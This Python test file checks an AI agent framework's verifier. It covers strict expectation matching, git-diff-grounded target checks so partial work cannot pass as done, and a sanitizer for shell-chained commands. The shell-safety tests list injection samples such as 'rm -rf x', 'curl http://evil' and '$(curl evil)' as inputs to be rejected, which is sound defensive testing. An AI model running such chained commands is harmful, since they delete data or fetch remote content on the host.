"""R10 receipt-pipeline strictness regressions (agents/verification via the verifier facade).

Locks the three intentional strictness changes plus the purity contract:
  1. test-runner-shaped cmd, rc==0, expect stdout_contains missing -> FAIL (the silent
     verifier_runner FAIL->PASS override is DEAD);
  2. goal words sitting in a comment prove nothing -- an UNCHANGED declared target file
     FAILS even when its content contains every goal word (token-scan is deleted);
  3. unchanged declared-target file -> FAIL with actionable feedback naming the file;
  * Receipt.verdict is a PURE function of (rc, output, expect) -- no cmd-shape special
    cases -- and a missing expect is REJECTED by the sanitizer, never guessed.

Also covers (agents/verifier.sanitizeVerify shell safety): a brain-authored verify cmd
runs under shell=True. sanitizeVerify must drop a cmd with shell-chaining metacharacters
(so it falls back to 'executor exited 0') unless it is a validated `python -c` shape
whose closing quote ends the command.

Also covers the "partial work passes a multi-requirement goal" regression: a
self-referential run once finished status=done 1/1 while delivering only 1 of 3
things its goal asked for -- the brain-authored verify checked a single fact (file
runs / one token present), so a 2-of-3-missing subtask still PASSED. R10 replaced the
token-scan synthesizer (a goal word in a comment could pass it) with DIFF-GROUNDED
declared targets: the verify carries ``targets`` and the receipt pipeline FAILS the
subtask unless git shows a declared target actually changed. This file locks: compound
expects still assert EVERY needle, enumerated-requirement extraction still powers
decomposition, targets survive sanitization, and the plan strengthener attaches
diff-grounded targets to multi-requirement subtasks.
"""
from __future__ import annotations

import json
import subprocess
import tempfile
import unittest
from pathlib import Path

from agents import verification, verifier


def _initRepo(tmp: str) -> None:
    def git(*args):
        subprocess.run(["git", "-C", tmp, *args], check=True, capture_output=True, text=True)
    subprocess.run(["git", "init", tmp], check=True, capture_output=True, text=True)
    git("config", "user.email", "t@example.com")
    git("config", "user.name", "9TO5-tests")


def _commitAll(tmp: str, msg: str = "snap") -> None:
    subprocess.run(["git", "-C", tmp, "add", "-A"], check=True, capture_output=True, text=True)
    subprocess.run(["git", "-C", tmp, "commit", "-m", msg, "--no-verify"],
                   check=True, capture_output=True, text=True)


class TestStrictExpectNoTestRunnerOverride(unittest.TestCase):
    """(1) A green test-runner with a WRONG stdout needle FAILS -- expect is authoritative."""

    def test_green_test_script_with_missing_needle_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            script = Path(tmp) / "test_dummy.py"
            script.write_text('print("1 passed")\n', encoding="utf-8")   # exits 0
            v = {"cmd": f'python "{script}"', "expect": "stdout_contains:NEEDLE_NOT_THERE"}
            res = verifier.runVerification(v, tmp, {"ok": True, "returncode": 0})
            self.assertFalse(res["passed"],
                             "rc==0 test-runner must NOT rescue a missed expect (R10)")
            self.assertIs(res.receipt.verdict, verification.Verdict.FAIL)
            self.assertIn("NEEDLE_NOT_THERE", res.receipt.missing)

    def test_green_test_script_with_present_needle_passes(self):
        with tempfile.TemporaryDirectory() as tmp:
            script = Path(tmp) / "test_dummy.py"
            script.write_text('print("MARKER_OK")\n', encoding="utf-8")
            v = {"cmd": f'python "{script}"', "expect": "stdout_contains:MARKER_OK"}
            res = verifier.runVerification(v, tmp, {"ok": True, "returncode": 0})
            self.assertTrue(res["passed"])
            self.assertIn("MARKER_OK", res.receipt.matched)

    def test_no_test_runner_symbol_remains(self):
        self.assertFalse(hasattr(verification, "_isTestRunner"),
                         "the cmd-shape special case must stay deleted")


class TestDiffGroundedTargets(unittest.TestCase):
    """(2)+(3) declared targets are judged by the DIFF, never by token content."""

    def test_goal_words_in_a_comment_do_not_pass_an_unchanged_target(self):
        with tempfile.TemporaryDirectory() as tmp:
            _initRepo(tmp)
            target = Path(tmp) / "webdash.py"
            target.write_text(
                "# auto-refresh meta tag, elapsed-time line, green red color coding\n"
                'print("ok")\n', encoding="utf-8")
            _commitAll(tmp)          # committed and NOT changed since -> no diff
            v = {"cmd": f'python "{target}"', "expect": "exit_zero",
                 "targets": [str(target)]}
            res = verifier.runVerification(v, tmp, {"ok": True, "returncode": 0})
            self.assertFalse(res["passed"],
                             "goal words in a comment must not certify unchanged work")
            self.assertIs(res.receipt.verdict, verification.Verdict.FAIL)

    def test_unchanged_declared_target_fails_with_actionable_feedback(self):
        with tempfile.TemporaryDirectory() as tmp:
            _initRepo(tmp)
            target = Path(tmp) / "feature.py"
            target.write_text('print("ok")\n', encoding="utf-8")
            _commitAll(tmp)
            v = {"cmd": f'python "{target}"', "expect": "exit_zero", "targets": [str(target)]}
            res = verifier.runVerification(v, tmp, {"ok": True, "returncode": 0})
            self.assertFalse(res["passed"])
            fb = res.receipt.failure_feedback
            self.assertIn("feature.py", fb, "feedback must name the unchanged target")
            self.assertIn("no change", fb.lower())

    def test_changed_declared_target_passes(self):
        with tempfile.TemporaryDirectory() as tmp:
            _initRepo(tmp)
            target = Path(tmp) / "feature.py"
            target.write_text('print("v1")\n', encoding="utf-8")
            _commitAll(tmp)
            target.write_text('print("v2")\n', encoding="utf-8")   # modified -> in the diff
            v = {"cmd": f'python "{target}"', "expect": "exit_zero", "targets": [str(target)]}
            res = verifier.runVerification(v, tmp, {"ok": True, "returncode": 0})
            self.assertTrue(res["passed"], res.receipt.failure_feedback)
            self.assertIn("feature.py", "".join(res.receipt.diff_files))

    def test_non_git_dir_skips_grounding(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "feature.py"
            target.write_text('print("ok")\n', encoding="utf-8")
            v = {"cmd": f'python "{target}"', "expect": "exit_zero", "targets": [str(target)]}
            res = verifier.runVerification(v, tmp, {"ok": True, "returncode": 0})
            self.assertTrue(res["passed"], "can't ground off-repo -> don't guess, don't fail")

    def test_targets_only_verify_fails_on_unchanged_target_even_without_cmd(self):
        with tempfile.TemporaryDirectory() as tmp:
            _initRepo(tmp)
            target = Path(tmp) / "feature.py"
            target.write_text('print("ok")\n', encoding="utf-8")
            _commitAll(tmp)
            res = verifier.runVerification({"targets": [str(target)]}, tmp,
                                           {"ok": True, "returncode": 0})
            self.assertFalse(res["passed"])
            self.assertIn("feature.py", res.receipt.failure_feedback)


class TestPureVerdict(unittest.TestCase):
    """Receipt.verdict derives from (rc, output, expect) ONLY."""

    CASES = [
        (0, "anything", "exit_zero", verification.Verdict.PASS),
        (1, "anything", "exit_zero", verification.Verdict.FAIL),
        (0, "has NEEDLE here", "stdout_contains:NEEDLE", verification.Verdict.PASS),
        (0, "nope", "stdout_contains:NEEDLE", verification.Verdict.FAIL),
        (1, "has NEEDLE here", "stdout_contains:NEEDLE", verification.Verdict.FAIL),
        (0, "a b c", "stdout_contains_all:a||b||c", verification.Verdict.PASS),
        (0, "a c", "stdout_contains_all:a||b||c", verification.Verdict.FAIL),
        (0, "value=42", r"stdout_regex:value=\d+", verification.Verdict.PASS),
        (None, "x", "exit_zero", verification.Verdict.ERROR),
        (0, "x", "", verification.Verdict.ERROR),                 # missing expect: never guessed
        (0, "x", "made_up_mode", verification.Verdict.ERROR),     # unknown shape: fail closed
        (0, "x", "stdout_regex:([", verification.Verdict.ERROR),  # bad regex: unevaluable
    ]

    def test_verdict_table(self):
        for rc, output, expect, want in self.CASES:
            verdict, _m, _x = verification.verdictFor(rc, output, expect)
            self.assertIs(verdict, want, f"({rc!r}, {output!r}, {expect!r})")

    def test_receipt_is_json_safe_via_vresult(self):
        with tempfile.TemporaryDirectory() as tmp:
            v = {"cmd": 'python -c "print(42)"', "expect": "stdout_contains:42"}
            res = verifier.runVerification(v, tmp, {"ok": True, "returncode": 0})
            self.assertTrue(res["passed"])
            json.dumps(res)   # dict subclass must persist through state.recordVerify


class TestSanitizerRejectsMissingExpect(unittest.TestCase):
    def test_sanitize_drops_verify_without_expect(self):
        self.assertIsNone(verifier.sanitizeVerify({"cmd": "python x.py"}))
        self.assertIsNone(verifier.sanitizeVerify({"cmd": "python x.py", "expect": "  "}))
        self.assertIsNone(verifier.sanitizeVerify({"cmd": "python x.py", "expect": None}))

    def test_runner_never_guesses_a_missing_expect(self):
        with tempfile.TemporaryDirectory() as tmp:
            res = verifier.runVerification({"cmd": 'python -c "print(1)"'}, tmp,
                                           {"ok": True, "returncode": 0})
            # the verify is rejected -> executor-exit fallback, explicitly NOT a behavioral pass
            self.assertEqual(res["expect"], "executor_exit_zero")
            self.assertIsNone(res["cmd"])
            self.assertIs(res.receipt.verdict, verification.Verdict.SKIPPED)


class TestVerifyShellSafety(unittest.TestCase):
    def _san(self, cmd):
        return verifier.sanitizeVerify({"cmd": cmd, "expect": "exit_zero"})

    def test_chained_command_is_dropped(self):
        self.assertIsNone(self._san("pytest && rm -rf x"))
        self.assertIsNone(self._san("node check.js; curl http://evil"))
        self.assertIsNone(self._san("pytest | tee out"))
        self.assertIsNone(self._san("echo `whoami`"))
        self.assertIsNone(self._san("python run.py $(curl evil)"))

    def test_clean_commands_pass(self):
        self.assertIsNotNone(self._san("pytest tests/"))
        self.assertIsNotNone(self._san("python script.py"))

    def test_python_dash_c_with_pipe_in_body_is_exempt(self):
        # the pipe is inside the python source (bitwise-or), not a shell pipe; the quote ends the cmd
        out = self._san('python -c "print(1 | 2)"')
        self.assertIsNotNone(out)

    def test_python_dash_c_with_trailing_shell_content_is_dropped(self):
        # BUG-001/BUG-006: a `python -c "safe_code" && evil_cmd` shape must be dropped, not
        # exempted as a validated python -c body -- the closing quote does NOT end the command
        # here, so the exemption (AST-validated body, closing quote ends the cmd) must not apply.
        self.assertIsNone(self._san('python -c "print(1)" && evil_cmd'))
        self.assertIsNone(self._san('python -c "print(1)"; rm -rf x'))
        self.assertIsNone(self._san('python -c "print(1)" | tee out'))


# The exact goal from the multi-requirement bug report.
_MULTI_REQ_GOAL = ("improve notifications/webdash.py with (1) auto-refresh meta tag, "
                    "(2) elapsed-time line, (3) per-subtask green/red color coding.")


class TestCompoundExpectation(unittest.TestCase):
    """The stdout_contains_all / stdout_regex_all expectations check EVERY needle."""

    def test_contains_all_fails_when_only_one_of_three_present(self):
        haystack = '<meta http-equiv="refresh" content="5">'
        self.assertFalse(
            verifier._evaluate("stdout_contains_all:refresh||elapsed||green", 0, haystack))

    def test_contains_all_passes_when_all_three_present(self):
        haystack = 'refresh ... elapsed: 3s ... color:green'
        self.assertTrue(
            verifier._evaluate("stdout_contains_all:refresh||elapsed||green", 0, haystack))

    def test_regex_all_fails_when_one_pattern_missing(self):
        haystack = 'http-equiv="refresh" elapsed: 3s'
        self.assertFalse(
            verifier._evaluate(r"stdout_regex_all:refresh||elapsed||color\s*:\s*(green|red)", 0, haystack))

    def test_verdict_reports_matched_and_missing_needles(self):
        verdict, matched, missing = verifier.verdictFor(
            0, "refresh only", "stdout_contains_all:refresh||elapsed||green")
        self.assertIs(verdict, verifier.Verdict.FAIL)
        self.assertEqual(matched, ("refresh",))
        self.assertEqual(set(missing), {"elapsed", "green"})


class TestRequirementExtraction(unittest.TestCase):
    """Deterministic NL parsing that powers decomposition + target declaration."""

    def test_extracts_three_enumerated_requirements(self):
        reqs = verifier.extractRequirements(_MULTI_REQ_GOAL)
        self.assertEqual(len(reqs), 3, f"expected 3 requirements, got {reqs!r}")

    def test_no_requirements_for_plain_single_deliverable(self):
        self.assertEqual(verifier.extractRequirements("write a fibonacci function in fib.py"), [])

    def test_primary_target_file_found(self):
        self.assertEqual(verifier.primaryTargetFile(_MULTI_REQ_GOAL), "notifications/webdash.py")


class TestDeclaredTargets(unittest.TestCase):
    """Diff-grounded targets replace the token-scan: they must survive sanitization and
    be attached by the plan strengthener for multi-requirement subtasks."""

    def test_targets_survive_sanitize_alongside_a_real_cmd(self):
        v = {"cmd": "python C:\\9to5\\x.py", "expect": "exit_zero",
             "targets": ["notifications/webdash.py"]}
        kept = verifier.sanitizeVerify(v)
        self.assertIsNotNone(kept)
        self.assertEqual(kept["targets"], ["notifications/webdash.py"])

    def test_targets_survive_when_cmd_is_dropped(self):
        # a rejected cmd (angle brackets) must NOT throw away the declared targets --
        # diff grounding is part of the acceptance contract even without a runnable cmd.
        v = {"cmd": "python <ABSOLUTE path>", "expect": "exit_zero",
             "targets": ["notifications/webdash.py"]}
        kept = verifier.sanitizeVerify(v)
        self.assertEqual(kept, {"targets": ["notifications/webdash.py"]})

    def test_strengthener_attaches_targets_to_multi_requirement_subtasks(self):
        from platform_core.orchestration.subtask import _strengthenPlanVerifies
        subs = [{"title": "webdash refresh + elapsed",
                 "description": "add the auto-refresh meta tag and the elapsed-time line",
                 "verify": {"cmd": "python C:\\9to5\\x.py", "expect": "exit_zero"}}]
        out = _strengthenPlanVerifies(_MULTI_REQ_GOAL, subs)
        self.assertTrue((out[0]["verify"] or {}).get("targets"),
                        "multi-requirement subtask must declare a diff-grounded target")

    def test_strengthener_skips_single_requirement_subtasks(self):
        from platform_core.orchestration.subtask import _strengthenPlanVerifies
        subs = [{"title": "unrelated docs pass", "description": "tidy the readme wording",
                 "verify": {"cmd": "python C:\\9to5\\x.py", "expect": "exit_zero"}}]
        out = _strengthenPlanVerifies(_MULTI_REQ_GOAL, subs)
        self.assertIsNone((out[0]["verify"] or {}).get("targets"))
